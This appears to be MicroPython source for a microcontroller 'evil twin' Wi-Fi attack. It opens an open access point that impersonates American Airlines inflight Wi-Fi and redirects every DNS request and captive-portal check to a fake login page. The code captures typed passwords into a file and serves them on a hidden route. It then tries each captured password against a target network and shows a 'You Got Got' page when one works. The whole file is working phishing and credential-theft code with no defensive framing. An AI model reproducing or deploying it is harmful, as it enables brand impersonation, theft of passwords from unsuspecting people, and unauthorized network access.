from phew import server, dns, logging, template
from phew.template import render_template
from phew.server import redirect
from ssd1306 import SSD1306_I2C
from machine import Pin, I2C, ADC
import framebuf
import _thread
import network
import time
import os


# Evil Site Setup
DOMAIN = "americanairlinesinflight.com"  # Address for the Captive Portal
DATA_FILE = "t3st1ngF1les.txt"  # File to save submitted data
GGs = "ggCheck.txt"
STATE = False
SSID = "aainflight"
testPass = ""

# oled Screen Setup
WIDTH = 128
HEIGHT = 64
buffer = bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xe0\x00\x00\x01\xf8\x00\x0f\xfc\x00\x00\x0f\xfc\x00\x0f\xff\x00\x00?\xf8\x00\x0f\x7f\xc0\x00\xff<\x00\x0f\x07\xe1\x81\xf8<\x00\x0f\x01\xff\xff\xc0<\x00\x0f\x00\xfe\xff\xc0<\x00\x06\x03\xff\xff\xf08\x00\x07\x07\xf0\x03\xf88\x00\x07\x1f\x80\x00~8\x00\x07>\x00\x00\x1d8\x00\x07\xfc\x00\x00\x0fx\x00\x03\xf8\x00\x00\x07\xf0\x00\x03\xf0\x00\x00\x03\xf0\x00\x03\xe0\x00\x00\x01\xf0\x00\x03\xc1\x80\x00p\xf0\x00\x03\xcf\xe0\x01\xfc\xf0\x00\x07\x9f\xf8\x07\xfex\x00\x07\xbdx\x07\xffp\x00\x07x<\x0f\x07\xb8\x00\x07\xf3\x9c\x0es\xf8\x00\x0f\xe7\xdc\x0e\xfb\xfc\x00\x0f\xe7\x9c\x0e\xf9\xfc\x00\x0f\xc7\xdc\x0e\xf8x\x00\x0f\x81\x1c\x0e x\x00\x0f\x80\x1c\x0e\x00|\x00\x0f\x00\x1c\x0e\x00<\x00\x07\x00<\x0f\x008\x00\x07\x808\x07\x00x\x00\x07\x808\x07\x00x\x00\x03\xc09\xe7\x00\xf0\x00\x01\xf09\xe7\x03\xe0\x00\x00\xf81\xe7\x87\xc0\x00\x00~x\x07\xbf\x80\x00\x00?\xf8\x07\xff\x00\x00\x00\x07\xff\xff\xfc\x00\x00\x00\x03\xff\xff\xf0\x00\x00\x00\x00?\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
fb = framebuf.FrameBuffer(buffer, 50, 50, framebuf.MONO_HLSB)
i2c = I2C(1, scl=Pin(12), sda=Pin(14),freq=200000)
oled = SSD1306_I2C(WIDTH, HEIGHT, i2c)

# LED
led = Pin(2, Pin.OUT)

def screenStuff(msg, x, y, **kwargs):
    oled.fill(0)
    oled.blit(fb, 32, 20)
    oled.invert(0)
    oled.text("Trash Panda", 15, 0)
    oled.text(msg, x, y)
    m2 = kwargs.get("m2","")
    x2 = kwargs.get("x2",0)
    y2 = kwargs.get("y2",0)
    oled.text(m2, x2, y2)
    oled.show()

@server.route("/", methods=["GET", "POST"])
def index(request):
    """Render the Index page or gg.html based on AP connectivity"""
    logging.debug("Checking Status")
    status = checkFile()
    logging.debug(f"Status: {status}")

    if status == True:
        logging.debug("Serving the GG page.")
        screenStuff(f"[GG]",8,8,m2=f"GG is shown!",x2=8,y2=16)
        led.value(1)
        return redirect("/GG_no_re")
    else:
        logging.debug("Serving the main page.")
        led.value(0)
        screenStuff(f"[0.0]",8,8,m2=f"Index!!!",x2=8,y2=16)
        return render_template("index.html")
        


@server.route("/login", methods=["POST"])
def login(request):
    """Handle form submissions and save data"""
    # Extract form data
    password = request.form.get("password", "Unknown")
    global testPass
    testPass = password

    # Save data to file
    try:
        with open(DATA_FILE, "a") as f:
            f.write(f"SSID: {SSID}, password: {password}\n")
        logging.info(f"Data saved: SSID: {SSID}, password={password}")
        screenStuff(f"[0.0]",8,8,m2=f"Checking!",x2=8,y2=16)
        return redirect(f"http://{DOMAIN}/checking")
        # Attempt to connect to Wi-Fi

    except Exception as e:
        logging.error(f"Error saving data: {e}")
        return "500 Internal Server Error", "text/plain", "Failed to save data."


@server.route("/runitdownmidlane", methods=["GET"])
def view_data(request):
    """Serve the contents of the captured data file"""
    try:
        with open(DATA_FILE, "r") as f:
            file_content = f.read()
        return file_content, "text/plain", ""
    except Exception as e:
        logging.error(f"Error reading file: {e}")
        return "500 Internal Server Error", "text/plain", "Could not read file."


@server.route("/checking", methods=["GET"])
def checking_page(request):
    """Serve the checking credentials page"""
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Credentials</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            text-align: center;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        h1 {
            font-size: 2rem;
        }
    </style>
    <script>
        // Reload the page after 10 seconds
        setTimeout(function() {
            window.location.href = "/";
        }, 15000);
    </script>
</head>
<body>
    <h1>Please wait. Checking Credentials...</h1>
</body>
</html>
"""
    _thread.start_new_thread(connect_wifi,("2Sneaky4Link", testPass))
    return html, "text/html", ""


@server.route("/generate_204", methods=["GET"])
def generate_204(request):
    """Handle Android captive portal detection"""
    logging.debug("Android captive portal detection triggered.")
    return render_template("index.html")


@server.route("/hotspot-detect.html", methods=["GET"])
def hotspot_detect(request):
    """Handle iOS captive portal detection"""
    logging.debug("iOS captive portal detection triggered.")
    return render_template("index.html")

@server.route("/wrong-host-redirect", methods=["GET"])
def wrong_host_redirect(request):
  # if the client requested a resource at the wrong host then present 
  # a meta redirect so that the captive portal browser can be sent to the correct location
  return redirect(f"http://{DOMAIN}/")

@server.route("/repls", methods=["GET"])
def reset(request):
  # if the client requested a resource at the wrong host then present 
  # a meta redirect so that the captive portal browser can be sent to the correct location
    with open("ggCheck.txt", "w") as f:
        f.write("False")
    logging.debug("Reseting Check")
    return redirect(f"http://{DOMAIN}/")

@server.catchall()
def catch_all(request):
    if request.headers.get("host") == "192.168.4.1":
        logging.debug("We got them")
        return redirect("http://" + DOMAIN + "/wrong-host-redirect")
    
    if request.headers.get("host") != DOMAIN:
        logging.debug(f"Redirecting unknown request: {request.headers}\n,{request.data}\n,{request.headers.get('host')}")
        return redirect("http://" + DOMAIN + "/wrong-host-redirect")
    else:
        logging.debug(f"Redirecting unknown request: {request.headers}\n,{request.data}\n,{request.headers.get('host')}")
        
    return redirect(f"http://{DOMAIN}/")

@server.route("/GG_no_re", methods=["GET"])
def ggNoRe(request):
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You Got Got!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        h1 {
            font-size: 3rem;
            color: #333;
        }
    </style>
</head>
<body>
    <h1>Good Game! No Rematch! <3</h1>
</body>
</html>
"""
    if not checkFile():
        return redirect("http://" + DOMAIN + "/")
    
    _thread.start_new_thread(dc,())
    return html, "text/html", ""

def connect_wifi(ssid, password):
    """
    Connect to a Wi-Fi network while maintaining an access point.

    Args:
        ssid (str): The SSID of the Wi-Fi network to connect to.
        password (str): The password for the Wi-Fi network.

    Returns:
        bool: True if successfully connected to the Wi-Fi network, False otherwise.
    """
    time.sleep(1)
    ap = network.WLAN(network.AP_IF)
    ap.active(False)
    
    # Create and activate the station interface for Wi-Fi connection
    sta = network.WLAN(network.STA_IF)
    sta.active(False)
    sta.active(True)

    # Connect to the specified Wi-Fi network
    logging.info(f"Connecting to Wi-Fi SSID: {ssid}:{password}")
    logging.debug("Pre going in")
    sta.connect(ssid, password)
    logging.debug("Going in!")

    # Wait for the connection to establish
    for _ in range(10):  # Retry for up to 10 seconds
        if sta.isconnected():
            logging.info(f"Connected to Wi-Fi! IP address: {sta.ifconfig()[0]}")
            with open("ggCheck.txt", "w") as f:
                f.write("True")
            sta.active(False)
            ap.active(True)
            logging.info("Success?")
            screenStuff(f"[GG]",8,8,m2=f"Success!",x2=8,y2=16)
            led.value(1)
            return True
        time.sleep(1)

    logging.error("Failed to connect to Wi-Fi.")
    sta.active(False)
    ap.active(True)
    return False


def dc():
    sta = network.WLAN(network.STA_IF)
    ap = network.WLAN(network.AP_IF)
    # sta.active(False)
    # ap.active(False)
    

def read_or_create_file(filename, default_content=""):
    """
    Read a file's content. If the file doesn't exist, create it with default content.

    Args:
        filename (str): The name of the file to read or create.
        default_content (str): The default content to write to the file if it doesn't exist.

    Returns:
        str: The content of the file.
    """
    try:
        # Check if the file exists
        if filename not in os.listdir():
            # Create the file with default content
            with open(filename, "w") as f:
                f.write(default_content)
            print(f"File '{filename}' created with default content.")
        
        # Read the file's content
        with open(filename, "r") as f:
            content = f.read()
        print(f"File '{filename}' read successfully.")
        print(f"Pre: {content}")
        if content != "False" and content != "True":
            with open(filename, "w") as f:
                f.write("False")
        with open(filename, "r") as f:
            content = f.read()
        print(f"Post: {content}")
        return content

    except Exception as e:
        print(f"Error handling file '{filename}': {e}")
        return None

def checkFile():
    hacked = read_or_create_file(GGs,"False")
    if hacked == "True":
        logging.info("They are hacked!!!")
        return True
    else:
        return False
    

led.value(0)
with open("ggCheck.txt", "w") as f:
    f.write("False")    

checkFile()

screenStuff(f"[Setup]",16,8,m2=f"Setting Up AP",x2=8,y2=16)
# Set up access point
logging.info("Setting up access point...")
ap = network.WLAN(network.AP_IF)
ap.active(True)
ap.config(essid=SSID, authmode=network.AUTH_OPEN)

# Get the IP address of the access point
ip = ap.ifconfig()[0]
logging.info(f"Access point active. IP: {ip}")
screenStuff(f"[Setup]",16,8,m2=f"Setup Done",x2=8,y2=16)

# Start the DNS server to redirect all domains
dns.run_catchall(ip)
logging.info("DNS server running, redirecting all domains to the captive portal.")

# Start the HTTP server
server.run()
logging.info("HTTP server running.")

